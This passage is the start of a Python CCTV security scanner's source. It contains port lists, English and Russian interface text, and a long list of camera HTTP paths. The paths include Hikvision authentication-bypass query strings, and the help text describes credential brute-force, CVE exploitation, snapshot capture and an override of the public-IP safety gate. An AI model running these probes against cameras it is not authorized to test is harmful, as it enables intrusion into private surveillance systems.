
import argparse
import asyncio
import base64
from datetime import datetime, timezone
import hashlib
import ipaddress
import json
import logging
import os
import re
import socket
import ssl
import struct
import sys
import textwrap
import threading
import time
from typing import Any, Callable, Dict, List, Optional, Set, Tuple, Union
from urllib.parse import parse_qs, urljoin, urlparse
import uuid
import warnings
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from requests.adapters import HTTPAdapter
from requests.auth import HTTPDigestAuth
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from rich import box
from rich.console import Console
from rich.panel import Panel
from rich.progress import (
    BarColumn,
    MofNCompleteColumn,
    Progress,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
    TimeRemainingColumn,
)
from rich.table import Table

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
warnings.filterwarnings("ignore")

R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
M = "\033[95m"
C = "\033[96m"
W = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
SHADOW = "\033[38;5;238m"
GRADIENT = [
    "\033[38;5;196m",
    "\033[38;5;202m",
    "\033[38;5;208m",
    "\033[38;5;214m",
    "\033[38;5;220m",
    "\033[38;5;226m",
    "\033[38;5;118m",
    "\033[38;5;48m",
    "\033[38;5;45m",
    "\033[38;5;39m",
    "\033[38;5;27m",
    "\033[38;5;93m",
    "\033[38;5;129m",
    "\033[38;5;165m",
]

RC = Console(highlight=False)
PRINT_LOCK = threading.RLock()
LANG = "en"
CONFIG_PATH = os.path.join(os.path.expanduser("~"), ".cctvscanner.json")
I18N = {
    "en": {
        "banner_sub": "══════════  S ROOT SECURITY SCANNER v1.5  ══════════",
        "banner_hint": "⚡ Fast by default · --full for deep · --log for files · -ru for Russian",
        "banner_brands": "Hikvision · Dahua · Axis · D-Link · Hanwha · Reolink · Uniview · Bosch · TVT",
        "lang_set_ru": "Language set to Russian and saved.",
        "lang_set_en": "Language set to English and saved.",
        "verdict_title": "SCAN VERDICT",
        "verdict_ip": "Target IP",
        "verdict_status": "Security Status",
        "verdict_risk": "Risk Score",
        "verdict_model": "Device Model",
        "verdict_brands": "Brands",
        "verdict_ports": "Open Ports",
        "verdict_creds": "Compromised Credentials",
        "verdict_cves": "Confirmed Vulnerabilities",
        "verdict_streams": "Active Streams",
        "status_critical": "CRITICAL: COMPROMISED",
        "status_caution": "CAUTION: EXPOSED",
        "status_secure": "SECURE: NO PORTS",
        "summary_title": "Comprehensive Security Audit Summary",
        "duration_risk": "Duration: {dur}s   |   Risk Score: {risk}/100",
        "device_info": "Discovered Device Information",
        "open_ports": "Open Network Ports",
        "creds_title": "Compromised Credentials",
        "cves_title": "Confirmed Vulnerabilities",
        "no_targets": "No valid targets available for scanning.",
        "queued": "Queued {n} target host(s) for security assessment",
        "target_n": "Target [{i}/{n}]: {raw}",
        "done": "Security Assessment Execution Complete!",
        "interrupted": "Scan interrupted by user. Saving partial records...",
        "public_err": "Error: Target {ip} is public and confirmation was not provided. Use --i-own-this to override.",
        "property": "Property",
        "value": "Discovered Value",
        "port": "Port",
        "service": "Service",
        "category": "Category",
        "banner_col": "Banner / Info",
        "method": "Method",
        "username": "Username",
        "password": "Password",
        "endpoint": "Endpoint URL",
        "cve_id": "CVE ID",
        "brand": "Brand",
        "severity": "Severity",
        "description": "Description",
        "none": "None",
        "enter_target": "Enter target (IP / CIDR / IP:PORT / file): ",
        "no_target_entered": "No target entered.",
        "help_desc": "S Root Security Scanner v1.5 — Enterprise Security Assessment Tool",
        "h_target": "Target IP / CIDR / IP:PORT / IP range",
        "h_file": "File with targets",
        "h_timeout": "Connection timeout",
        "h_threads": "Max concurrent connections",
        "h_ports": "Custom comma-separated ports",
        "h_output": "Output directory (default: ./cctv_results in current folder)",
        "h_top_ports": "Scan top N camera ports",
        "h_full": "Full deep scan (all ports + creds + CVE). Default is fast",
        "h_force": "Continue scan unconditionally",
        "h_no_creds": "Skip credential brute-force",
        "h_no_exploit": "Skip CVE exploit verification",
        "h_no_streams": "Skip stream checking",
        "h_no_auth": "Skip auth pages scan",
        "h_no_onvif": "Skip ONVIF probing",
        "h_no_tls": "Skip TLS certificate analysis",
        "h_no_html": "Skip HTML report generation",
        "h_no_json": "Skip JSON report generation",
        "h_verbose": "Verbose console output",
        "h_ru": "Russian language (saved to config)",
        "h_en": "English language (saved to config)",
        "h_log": "Enable file logging",
        "h_udp": "UDP discovery (WS-Discovery, SSDP, SADP, DHDiscover)",
        "h_snmp": "SNMP discovery",
        "h_p0f": "TCP/IP OS fingerprinting",
        "h_sarif": "Export findings in SARIF 2.1.0 format",
        "h_md": "Export summary report in Markdown format",
        "h_stix": "Export threat bundle in STIX 2.1 format",
        "h_http2": "Probe HTTP/2 ALPN support",
        "h_http3": "Probe HTTP/3 Alt-Svc support",
        "h_resume": "Resume scan from JSON report",
        "h_rate": "Rate limit requests/sec",
        "h_proxy": "HTTP/SOCKS proxy URL",
        "h_ua": "Custom User-Agent header",
        "h_hosts": "Concurrent target hosts",
        "h_exclude": "Exclude IP or CIDR network",
        "h_ports_file": "Load target ports from file",
        "h_creds_file": "Load credentials from file (user:pass)",
        "h_cve_file": "Load custom CVE list from file",
        "h_safety": "Enforce safety gate for public IPs",
        "h_no_safety": "Disable safety gate confirmation",
        "h_own": "Bypass safety gate for public IPs",
        "h_flat": "Flat output directory (no subfolders)",
        "h_snap": "Save discovered camera snapshots to disk",
        "h_cfg": "Save discovered configuration files to disk",
        "h_quiet": "Quiet mode: minimal console output",
        "h_brands": "Only check these brands (comma-separated)",
        "h_max_auth": "Limit auth paths to probe (0 = all)",
        "h_max_stream": "Limit stream paths to probe (0 = all)",
        "h_priority": "Probe only high-priority paths (faster)",
        "own_prompt": 'Enter "I OWN THIS" to proceed: ',
    },
    "ru": {
        "banner_sub": "══════════  S ROOT SECURITY SCANNER v1.5  ══════════",
        "banner_hint": "⚡ Быстрый по умолчанию · --full полный скан · --log логи · -ru / --en язык",
        "banner_brands": "Hikvision · Dahua · Axis · D-Link · Hanwha · Reolink · Uniview · Bosch · TVT",
        "lang_set_ru": "Язык переключён на русский и сохранён.",
        "lang_set_en": "Язык переключён на английский и сохранён.",
        "verdict_title": "ИТОГ СКАНИРОВАНИЯ",
        "verdict_ip": "Целевой IP",
        "verdict_status": "Статус безопасности",
        "verdict_risk": "Оценка риска",
        "verdict_model": "Модель устройства",
        "verdict_brands": "Бренды",
        "verdict_ports": "Открытые порты",
        "verdict_creds": "Скомпрометированные учётки",
        "verdict_cves": "Подтверждённые уязвимости",
        "verdict_streams": "Активные потоки",
        "status_critical": "КРИТИЧНО: СКОМПРОМЕТИРОВАН",
        "status_caution": "ВНИМАНИЕ: ОТКРЫТ",
        "status_secure": "БЕЗОПАСНО: НЕТ ПОРТОВ",
        "summary_title": "Итоговый отчёт по безопасности",
        "duration_risk": "Длительность: {dur}с   |   Оценка риска: {risk}/100",
        "device_info": "Информация об устройстве",
        "open_ports": "Открытые сетевые порты",
        "creds_title": "Скомпрометированные учётные данные",
        "cves_title": "Подтверждённые уязвимости",
        "no_targets": "Нет корректных целей для сканирования.",
        "queued": "В очереди {n} хост(ов) для проверки",
        "target_n": "Цель [{i}/{n}]: {raw}",
        "done": "Проверка безопасности завершена!",
        "interrupted": "Сканирование прервано. Сохранение частичных данных...",
        "public_err": "Ошибка: {ip} — публичный IP, подтверждение не получено. Используйте --i-own-this.",
        "property": "Свойство",
        "value": "Значение",
        "port": "Порт",
        "service": "Служба",
        "category": "Категория",
        "banner_col": "Баннер / Инфо",
        "method": "Метод",
        "username": "Логин",
        "password": "Пароль",
        "endpoint": "URL",
        "cve_id": "CVE ID",
        "brand": "Бренд",
        "severity": "Критичность",
        "description": "Описание",
        "none": "Нет",
        "enter_target": "Введите цель (IP / CIDR / IP:PORT / файл): ",
        "no_target_entered": "Цель не введена.",
        "help_desc": "S Root Security Scanner v1.5 — инструмент оценки безопасности",
        "h_target": "Целевой IP / CIDR / IP:PORT / диапазон",
        "h_file": "Файл со списком целей",
        "h_timeout": "Таймаут соединения (сек)",
        "h_threads": "Макс. число потоков",
        "h_ports": "Свои порты через запятую",
        "h_output": "Папка результатов (по умолчанию ./cctv_results)",
        "h_top_ports": "Сканировать топ N портов камер",
        "h_full": "Полный скан (все порты + пароли + CVE). По умолчанию быстрый",
        "h_force": "Продолжать без условий",
        "h_no_creds": "Не перебирать пароли",
        "h_no_exploit": "Не проверять CVE",
        "h_no_streams": "Не искать видеопотоки",
        "h_no_auth": "Не искать страницы входа",
        "h_no_onvif": "Не проверять ONVIF",
        "h_no_tls": "Не анализировать TLS",
        "h_no_html": "Не создавать HTML-отчёт",
        "h_no_json": "Не создавать JSON-отчёт",
        "h_verbose": "Подробный вывод в консоль",
        "h_ru": "Русский язык (сохраняется в конфиг)",
        "h_en": "Английский язык (сохраняется в конфиг)",
        "h_log": "Включить запись логов в файлы",
        "h_udp": "UDP-обнаружение (WS-Discovery, SSDP, SADP, DHDiscover)",
        "h_snmp": "SNMP-обнаружение",
        "h_p0f": "Определение ОС по TCP/IP",
        "h_sarif": "Экспорт в SARIF 2.1.0",
        "h_md": "Экспорт отчёта в Markdown",
        "h_stix": "Экспорт в STIX 2.1",
        "h_http2": "Проверка поддержки HTTP/2",
        "h_http3": "Проверка поддержки HTTP/3",
        "h_resume": "Продолжить скан из JSON-отчёта",
        "h_rate": "Лимит запросов в секунду",
        "h_proxy": "HTTP/SOCKS прокси",
        "h_ua": "Свой User-Agent",
        "h_hosts": "Число целей одновременно",
        "h_exclude": "Исключить IP или сеть CIDR",
        "h_ports_file": "Загрузить порты из файла",
        "h_creds_file": "Загрузить пароли из файла (user:pass)",
        "h_cve_file": "Загрузить свой список CVE",
        "h_safety": "Требовать подтверждение для публичных IP",
        "h_no_safety": "Отключить подтверждение безопасности",
        "h_own": "Обойти подтверждение для публичных IP",
        "h_flat": "Плоская структура папок (без подпапок)",
        "h_snap": "Сохранять снимки с камер на диск",
        "h_cfg": "Сохранять найденные конфиги на диск",
        "h_quiet": "Тихий режим: минимум вывода",
        "h_brands": "Только эти бренды (через запятую)",
        "h_max_auth": "Лимит путей auth (0 = все)",
        "h_max_stream": "Лимит путей stream (0 = все)",
        "h_priority": "Только приоритетные пути (быстрее)",
        "own_prompt": 'Введите "I OWN THIS" для продолжения: ',
    },
}

def _load_config() -> Dict[str, Any]:
    try:
        if os.path.isfile(CONFIG_PATH):
            with open(CONFIG_PATH, encoding="utf-8") as f:
                data = json.load(f)
                if isinstance(data, dict):
                    return data
    except Exception:
        pass
    return {}

def _save_config(data: Dict[str, Any]) -> None:
    try:
        cur = _load_config()
        cur.update(data)
        with open(CONFIG_PATH, "w", encoding="utf-8") as f:
            json.dump(cur, f, ensure_ascii=False, indent=2)
    except Exception:
        pass

def t(key: str, **kwargs: Any) -> str:
    table = I18N.get(LANG) or I18N["en"]
    s = table.get(key) or I18N["en"].get(key) or key
    if kwargs:
        try:
            return s.format(**kwargs)
        except Exception:
            return s
    return s

def set_lang(lang: str, persist: bool = True) -> None:
    global LANG
    LANG = "ru" if lang == "ru" else "en"
    if persist:
        _save_config({"lang": LANG})

PORTS_CAM = [
    80, 443, 554, 1935, 3702, 7000, 7001, 7070, 7443, 8000, 8080, 8081,
    8082, 8088, 8090, 8443, 8554, 8888, 9000, 9100, 9110, 9120, 9130,
    9140, 9150, 9160, 9178, 9180, 9190, 9200, 9210, 9220, 9443, 9997,
    9999, 10554, 34567, 34568, 34599, 37777, 37778, 37810, 38888, 37020,
    5540, 5541, 5542, 6001, 6002, 6550, 6667, 7080, 8008, 8009, 8010,
    8020, 8030, 8040, 8050, 8060, 8070, 8100, 8180, 8181, 8200, 8300,
    8400, 8444, 8500, 8600, 8700, 8800, 8899, 8999, 10000, 10080, 10443,
    5543, 5544, 5545, 6000, 6003, 6004, 6005, 6006, 6007, 6008, 6009,
    7002, 7003, 7004, 7005, 7006, 7007, 7008, 7009, 7010, 7071, 7072,
    7554, 7777, 8083, 8084, 8085, 8086, 8087, 8089, 8091, 8092, 8093,
    8094, 8095, 8096, 8097, 8098, 8099, 8110, 8120, 8130, 8140, 8150,
    8160, 8170, 8190, 8210, 8220, 8230, 8240, 8250, 8260, 8270, 8280,
    8290, 8310, 8320, 8330, 8340, 8350, 8360, 8370, 8380, 8390, 8410,
    8420, 8430, 8450, 8460, 8470, 8480, 8490, 8510, 8520, 8530, 8540,
    8555, 8556, 8557, 8558, 8559, 8560, 8570, 8580, 8590, 8610, 8620,
    8630, 8640, 8650, 8660, 8670, 8680, 8690, 8710, 8720, 8730, 8740,
    8750, 8760, 8770, 8780, 8790, 8801, 8802, 8808, 8810, 8820, 8830,
    8838, 8880, 8881, 8882, 8883, 8884, 8885, 8886, 8887, 8889, 8890,
    9001, 9002, 9003, 9010, 9020, 9050, 9060, 9070, 9080, 9090, 9170,
    9230, 9240, 9250, 9260, 9270, 9280, 9290, 9300, 9400, 9500, 9554,
    9600, 9700, 9800, 9900, 9998, 10001, 10008, 10081, 10123, 10240,
    11000, 11554, 12000, 12554, 13000, 13554, 14000, 14554, 15000, 15554,
    16000, 18000, 19000, 19999, 20000, 20001, 23000, 25000, 28001,
    30000, 31000, 32000, 33000, 34569, 34570, 34571, 34572, 34573, 34574,
    34575, 34576, 34577, 34578, 34579, 34580, 34585, 34590, 34595,
    35000, 35001, 35002, 35003, 35004, 35005, 36000, 36001, 37000, 37001,
    37779, 37780, 37781, 37782, 37785, 37790, 37795, 37799,
    40000, 40001, 40002, 40005, 40010, 42000, 44444, 45000, 49152, 49153,
    50000, 50001, 50002, 50005, 50010, 50011, 50012, 50013, 50014, 50015,
    51000, 51001, 51002, 51005, 51010, 51015, 51020, 51021, 51022, 51025,
    55555, 60000, 60001, 60002, 60005, 60010, 60011, 60012, 60015, 60020,
    61000, 61001, 61005, 61010, 62000, 62078, 63000, 64000, 65000, 65001,
    65002, 65005, 65010,
]

PORTS_EXT = [
    21, 22, 23, 25, 53, 67, 68, 69, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92,
    93, 94, 95, 96, 97, 98, 99, 110, 111, 119, 123, 135, 137, 138, 139, 143, 161, 162,
    179, 389, 445, 465, 500, 502, 514, 515, 520, 587, 623, 631, 636, 873, 902, 989, 990,
    993, 995, 1024, 1025, 1026, 1027, 1028, 1029, 1080, 1194, 1433, 1521, 1723, 1812, 1883,
    1900, 2000, 2049, 2082, 2083, 2086, 2087, 2181, 2222, 2375, 2376, 2480, 3000, 3001, 3128,
    3283, 3306, 3389, 3690, 3721, 4000, 4369, 4443, 4848, 5000, 5001, 5060, 5061, 5353, 5432,
    5555, 5672, 5683, 5684, 5800, 5900, 5984, 6000, 6379, 6666, 7001, 7002, 7003, 7004, 7005,
    7006, 7007, 7008, 7009, 7010, 7071, 7072, 7100, 7200, 7300, 7400, 7500, 7600, 7700, 7777,
    7800, 7900, 8001, 8002, 8003, 8004, 8005, 8006, 8007, 8011, 8012, 8013, 8014, 8015, 8016,
    8017, 8018, 8019, 8021, 8022, 8023, 8024, 8025, 8026, 8027, 8028, 8029, 8031, 8032, 8033,
    8034, 8035, 8036, 8037, 8038, 8039, 8083, 8084, 8085, 8086, 8087, 8089, 8091, 8092, 8093,
    8094, 8095, 8096, 8097, 8098, 8099, 8110, 8120, 8130, 8140, 8150, 8160, 8170, 8190, 8210,
    8220, 8230, 8240, 8250, 8260, 8270, 8280, 8290, 8310, 8320, 8330, 8340, 8350, 8360, 8370,
    8380, 8390, 8410, 8420, 8430, 8450, 8460, 8470, 8480, 8490, 8500, 8510, 8520, 8530, 8540,
    8555, 8556, 8557, 8558, 8559, 8560, 8570, 8580, 8590, 8610, 8620, 8630, 8640, 8650, 8660,
    8670, 8680, 8690, 8710, 8720, 8730, 8740, 8750, 8760, 8770, 8780, 8790, 8801, 8802, 8808,
    8810, 8820, 8830, 8838, 8880, 8881, 8882, 8883, 8884, 8885, 8886, 8887, 8889, 8890, 9001,
    9002, 9003, 9010, 9020, 9050, 9060, 9070, 9080, 9090, 9100, 9200, 9300, 9400, 9418, 9500,
    9554, 9600, 9700, 9800, 9900, 9998, 10001, 10008, 10081, 10123, 10240, 11000, 11211, 12000,
    13000, 14000, 15000, 16000, 18000, 19000, 19999, 20000, 20001, 23000, 25000, 27017, 27018,
    28001, 30000, 31000, 32000, 33000, 35000, 35001, 35002, 35003, 35004, 35005, 36000, 36001,
    37000, 37001, 40000, 42000, 44444, 45000, 49152, 49153, 49154, 49155, 49156, 49157, 50000,
    55555, 56000, 60001, 62078, 64443, 65000, 65432, 65535,
]

PORTS_CAM_SET: Set[int] = set(PORTS_CAM)
PORTS_ALL = list(dict.fromkeys(PORTS_CAM + [p for p in PORTS_EXT if p not in PORTS_CAM_SET]))
PORTS_ALL_SET: Set[int] = set(PORTS_ALL)
HTTPS_PORTS: Set[int] = {443, 8443, 8444, 9443, 10443, 4443, 7443, 1443, 5443, 6443, 8843, 9943}
SKIP_PORTS: Set[int] = {
    21, 22, 23, 25, 53, 110, 111, 135, 139, 143, 445, 993, 995, 1433,
    1723, 1883, 2375, 3306, 3389, 5432, 5900, 6379, 27017,
}
RTSP_PORTS_SET: Set[int] = {554, 8554, 10554, 5540, 5541, 5542, 5543, 5544, 5545}

SAFE_NETWORKS: List[Union[ipaddress.IPv4Network, ipaddress.IPv6Network]] = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("::1/128"),
    ipaddress.ip_network("fe80::/10"),
    ipaddress.ip_network("fc00::/7"),
]

SVC: Dict[int, Tuple[str, str]] = {
    80: ("HTTP", "Web"),
    443: ("HTTPS", "Secure Web"),
    554: ("RTSP", "Media Stream"),
    1935: ("RTMP", "Live Stream"),
    3702: ("WS-Discovery", "ONVIF Discovery"),
    7000: ("HTTP", "Web GUI"),
    7001: ("HTTP", "Web GUI"),
    7070: ("HTTP", "Hikvision Web"),
    7443: ("HTTPS", "UniFi Protect"),
    8000: ("HTTP", "Camera Web/Dev"),
    8080: ("HTTP", "Alt Web"),
    8081: ("HTTP", "Camera Admin"),
    8082: ("HTTP", "Camera Web"),
    8088: ("HTTP", "Streaming Web"),
    8090: ("HTTP", "Web GUI"),
    8443: ("HTTPS", "Secure Web"),
    8554: ("RTSP", "Alt RTSP"),
    8888: ("HTTP", "Admin Web"),
    9000: ("HTTP", "Dahua/Web"),
    9010: ("TCP", "Camera SDK"),
    9020: ("TCP", "Camera SDK"),
    9100: ("HTTP", "Hikvision Media"),
    9178: ("HTTP", "Hikvision Port"),
    9200: ("HTTP", "Hikvision Port"),
    9443: ("HTTPS", "Secure Web"),
    9997: ("HTTP", "DVR Gateway"),
    9999: ("HTTP", "DVR System"),
    10443: ("HTTPS", "Secure Camera"),
    10554: ("RTSP", "RTSP Proxy"),
    34567: ("TCP", "XiongMai DVR Media"),
    34568: ("TCP", "XiongMai DVR Alarm"),
    34599: ("TCP", "XiongMai Mobile"),
    37777: ("TCP", "Dahua Private"),
    37778: ("TCP", "Dahua Private Talk"),
    37810: ("UDP", "Dahua DHDiscover"),
    37020: ("UDP", "Hikvision SADP"),
    38888: ("TCP", "Uniview Media"),
    21: ("FTP", "File Transfer"),
    22: ("SSH", "Remote Shell"),
    23: ("TELNET", "Remote Shell"),
    25: ("SMTP", "Mail Relay"),
    53: ("DNS", "Name Resolution"),
    161: ("SNMP", "Network Management"),
    1900: ("SSDP", "UPnP Discovery"),
    3389: ("RDP", "Remote Desktop"),
    3721: ("HTTP", "TBK/DVR Web"),
    5000: ("HTTP", "Synology/Reolink"),
    5001: ("HTTPS", "Synology Surveillance"),
    5353: ("mDNS", "Multicast DNS"),
    5540: ("RTSP", "Alt RTSP"),
    6001: ("HTTP", "XVR Web"),
    8008: ("HTTP", "Dahua Alternate"),
    8899: ("HTTP", "ONVIF HTTP Port"),
    8999: ("HTTP", "ONVIF Alt Port"),
}
AUTH_PATHS = [
    "/", "/index.html", "/index.htm", "/login", "/login.html",
    "/login.asp", "/login.php", "/admin", "/admin/", "/admin.html",
    "/admin.php", "/doc/page/login.asp", "/doc/page/config.asp",
    "/doc/page/preview.asp", "/doc/index.html", "/main.htm", "/view.htm",
    "/live.htm", "/web/index.html", "/ui/index.html", "/ui/login.html",
    "/ISAPI/System/deviceInfo", "/ISAPI/System/capabilities",
    "/ISAPI/System/status", "/ISAPI/Security/userCheck",
    "/ISAPI/Security/users", "/ISAPI/Streaming/channels",
    "/ISAPI/Streaming/channels/101", "/ISAPI/Streaming/channels/101/picture",
    "/ISAPI/Streaming/channels/102", "/ISAPI/Streaming/channels/102/picture",
    "/ISAPI/Streaming/channels/1/picture", "/ISAPI/Streaming/channels/101/httpPreview",
    "/ISAPI/Streaming/channels/1/httpPreview", "/ISAPI/System/deviceInfo?format=json",
    "/ISAPI/System/Network/interfaces", "/ISAPI/ContentMgmt/InputProxy/channels",
    "/ISAPI/System/Video/inputs/channels", "/ISAPI/System/time",
    "/ISAPI/System/Hardware", "/ISAPI/System/deviceInfo/capabilities",
    "/ISAPI/Security/sessionLogin/capabilities", "/ISAPI/ContentMgmt/search",
    "/ISAPI/Event/notification/alertStream", "/ISAPI/System/reboot",
    "/ISAPI/System/upgradeStatus", "/ISAPI/System/IO/inputs",
    "/ISAPI/System/IO/outputs", "/ISAPI/Security/adminAccesses",
    "/ISAPI/AccessControl/UserInfo/Search", "/ISAPI/AccessControl/AcsEvent",
    "/ISAPI/System/Network/Bonding/interfaces", "/ISAPI/System/Network/EZVIZ",
    "/ISAPI/System/Network/UPnP/ports", "/PSIA/System/deviceInfo",
    "/PSIA/Streaming/channels/1/picture", "/PSIA/System/status",
    "/PSIA/System/capabilities", "/PSIA/Custom/SelfExt/System/deviceInfo",
    "/PSIA/index", "/PSIA/Security/AAA/users", "/onvif-http/snapshot",
    "/onvif/device_service", "/onvif/media_service", "/onvif/ptz_service",
    "/onvif/imaging_service", "/onvif/event_service", "/onvif/recording_service",
    "/onvif/analytics_service", "/onvif/deviceio_service", "/onvif/discovery_service",
    "/onvif/receiver_service", "/onvif/display_service",
    "/cgi-bin/magicBox.cgi?action=getSystemInfo",
    "/cgi-bin/magicBox.cgi?action=getMachineName",
    "/cgi-bin/magicBox.cgi?action=getDeviceType",
    "/cgi-bin/magicBox.cgi?action=getSoftwareVersion",
    "/cgi-bin/configManager.cgi?action=getConfig&name=All",
    "/cgi-bin/userManager.cgi?action=list",
    "/cgi-bin/userManager.cgi?action=getUserInfoAll",
    "/cgi-bin/snapshot.cgi",
    "/cgi-bin/hi3510/param.cgi?cmd=getserverinfo",
    "/cgi-bin/hi3510/param.cgi?cmd=getnetworkinfo",
    "/cgi-bin/CGIProxy.fcgi?cmd=getDevInfo",
    "/cgi-bin/api.cgi?cmd=GetDevInfo",
    "/cgi-bin/api.cgi?cmd=GetSyslog",
    "/cgi-bin/api.cgi?cmd=GetEnc",
    "/cgi-bin/api.cgi?cmd=GetOsd",
    "/cgi-bin/netManager.cgi?action=getNetConfig",
    "/cgi-bin/intervideoManager.cgi?action=getConfig",
    "/cgi-bin/recordManager.cgi?action=getConfig",
    "/cgi-bin/systemManager.cgi?action=reboot",
    "/cgi-bin/coaxial.cgi?action=getControlMode",
    "/cgi-bin/trafficManager.cgi?action=getDeviceList",
    "/RPC2", "/RPC2_Login", "/RPC2_User", "/RPC2_Config",
    "/axis-cgi/param.cgi?action=list",
    "/axis-cgi/param.cgi?action=list&group=root.Brand",
    "/axis-cgi/param.cgi?action=list&group=root.Properties",
    "/axis-cgi/param.cgi?action=list&group=root.Network",
    "/axis-cgi/param.cgi?action=list&group=root.Image",
    "/axis-cgi/basicdeviceinfo.cgi", "/axis-cgi/jpg/image.cgi",
    "/axis-cgi/mjpg/video.cgi", "/axis-cgi/pwdgrp.cgi?action=get",
    "/axis-cgi/pwdgrp.cgi?action=get&user=root",
    "/axis-cgi/applications/list.cgi", "/axis-cgi/record/list.cgi",
    "/axis-cgi/streamprofile.cgi", "/axis-cgi/view/param.cgi?action=list",
    "/axis-cgi/mediaclip.cgi", "/axis-cgi/memoryzones/add.cgi",
    "/axis-cgi/videostreamingindicator.cgi",
    "/axis-cgi/admin/param.cgi?action=list",
    "/axis-media/media.amp", "/axis-cgi/com/ptz.cgi",
    "/axis-cgi/com/ptzconfig.cgi", "/vapix/services",
    "/rcp.xml", "/dyn/login.m4", "/dyn/camera.m4", "/dyn/encoder.m4",
    "/dyn/system.m4", "/dyn/network.m4", "/dyn/video.m4", "/dyn/audio.m4",
    "/dyn/record.m4", "/dyn/alarms.m4", "/dyn/maintenance.m4",
    "/dyn/user.m4", "/dyn/certificates.m4", "/dyn/multicast.m4",
    "/dyn/service.m4", "/command/inquiry.cgi?inq=system",
    "/command/inquiry.cgi?inq=camera", "/command/inquiry.cgi?inq=network",
    "/command/inquiry.cgi?inq=protocol", "/command/preset.cgi",
    "/command/ptzf.cgi", "/oneshotimage.jpg", "/pelco/camera.xml",
    "/control/system/info", "/control/camera/info", "/control/user/info",
    "/control/network/info", "/pelco-bin/cam.cgi", "/pelco-bin/status.cgi",
    "/cgi-bin/viewer/getparam.cgi?system_info",
    "/cgi-bin/viewer/getparam.cgi?network_info",
    "/cgi-bin/viewer/getparam.cgi?video_info",
    "/cgi-bin/viewer/getparam.cgi?security_info",
    "/cgi-bin/viewer/video.jpg", "/cgi-bin/viewer/live.cgi",
    "/cgi-bin/camctrl/camctrl.cgi", "/cgi-bin/admin/setparam.cgi",
    "/cgi-bin/CGIProxy.fcgi?cmd=getDevState",
    "/cgi-bin/CGIProxy.fcgi?cmd=getDevAbility",
    "/cgi-bin/CGIProxy.fcgi?cmd=getIPInfo",
    "/cgi-bin/CGIProxy.fcgi?cmd=snapPicture2",
    "/cgi-bin/CGIProxy.fcgi?cmd=getLog",
    "/cgi-bin/CGIProxy.fcgi?cmd=getUserList",
    "/cgi-bin/global.cgi?action=getCurrentTime",
    "/cgi-bin/configManager.cgi?action=getConfig&name=Network",
    "/cgi-bin/configManager.cgi?action=getConfig&name=VideoInputNormalOptions",
    "/cgi-bin/api.cgi?cmd=GetChannelstatus",
    "/cgi-bin/api.cgi?cmd=GetWifiSignal",
    "/cgi-bin/api.cgi?cmd=GetUsers",
    "/cgi-bin/api.cgi?cmd=GetOnline",
    "/cgi-bin/api.cgi?cmd=GetIsp",
    "/LAPI/V1.0/System/Device/Info",
    "/LAPI/V1.0/System/Security/Users",
    "/LAPI/V1.0/Channels/1/Media/Video/Streams/1",
    "/LAPI/V1.0/System/Network/Interfaces",
    "/LAPI/V1.0/System/Time",
    "/LAPI/V1.0/System/Reboot",
    "/LAPI/V1.0/System/Device/BasicInfo",
    "/cgi-bin/operator/param.cgi?action=list&group=system",
    "/cgi-bin/operator/param.cgi?action=list&group=network",
    "/cgi-bin/operator/param.cgi?action=list&group=image",
    "/cgi-bin/operator/param.cgi?action=list&group=video",
    "/cgi-bin/getdeviceinfo.cgi", "/cgi-bin/getuserinfo.cgi",
    "/cgi-bin/getnetworkinfo.cgi", "/cgi-bin/getvideoinfo.cgi",
    "/device.rsp?opt=sys&cmd=get_device_info",
    "/device.rsp?opt=sys&cmd=get_net_info",
    "/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___",
    "/autologin.html", "/ssi.cgi/index.htm", "/ssi.cgi/devinfo.htm",
    "/ssi.cgi/netinfo.htm", "/ssi.cgi/caminfo.htm", "/GeoHttpServer",
    "/control/camerainfo", "/control/eventinfo", "/control/userlist",
    "/control/faststream.jpg", "/record/current.jpg",
    "/get?camera=1", "/get?system=all", "/get?network=all",
    "/image?res=full&x0=0&y0=0&x1=1920&y1=1080",
    "/cgi-bin/system", "/cgi-bin/stream", "/cgi-bin/config",
    "/cgi-bin/network", "/stw-cgi/system.cgi?msubmenu=deviceinfo",
    "/SDK/webLanguage", "/snapshot.jpg", "/snap.jpg", "/image.jpg",
    "/mjpg/video.mjpg", "/video.cgi", "/common/info.cgi", "/top.htm",
    "/get_params.cgi", "/cam/realmonitor?channel=1&subtype=0",
    "/Security/users?auth=YWRtaW46MTEK",
    "/System/configurationFile?auth=YWRtaW46MTEK",
    "/System/configurationFile?auth=YWRtaW46YWRtaW4K",
    "/ISAPI/Security/users?auth=YWRtaW46MTEK",
    "/ISAPI/Security/users?auth=YWRtaW46YWRtaW4K",
    "/ISAPI/System/deviceInfo?auth=YWRtaW46MTEK",
    "/ISAPI/System/deviceInfo?auth=YWRtaW46YWRtaW4K",
    "/ISAPI/System/deviceInfo?auth=YWRtaW46MTIzNDU=",
    "/ISAPI/Streaming/channels/101",
    "/ISAPI/Streaming/channels/102",
    "/ISAPI/Streaming/channels/101/picture",
    "/ISAPI/Streaming/channels/102/picture",
    "/ISAPI/ContentMgmt/InputProxy/channels/1",
    "/ISAPI/System/Video/inputs/channels/1",
    "/ISAPI/Streaming/channels/201",
    "/ISAPI/Streaming/channels/202",
    "/ISAPI/Streaming/channels/201/picture",
    "/ISAPI/Streaming/channels/202/picture",
    "/ISAPI/ContentMgmt/InputProxy/channels/2",
    "/ISAPI/System/Video/inputs/channels/2",
    "/ISAPI/Streaming/channels/301",
    "/ISAPI/Streaming/channels/302",
    "/ISAPI/Streaming/channels/301/picture",
    "/ISAPI/Streaming/channels/302/picture",
    "/ISAPI/ContentMgmt/InputProxy/channels/3",
    "/ISAPI/System/Video/inputs/channels/3",
    "/ISAPI/Streaming/channels/401",
    "/ISAPI/Streaming/channels/402",
    "/ISAPI/Streaming/channels/401/picture",
    "/ISAPI/Streaming/channels/402/picture",
    "/ISAPI/ContentMgmt/InputProxy/channels/4",
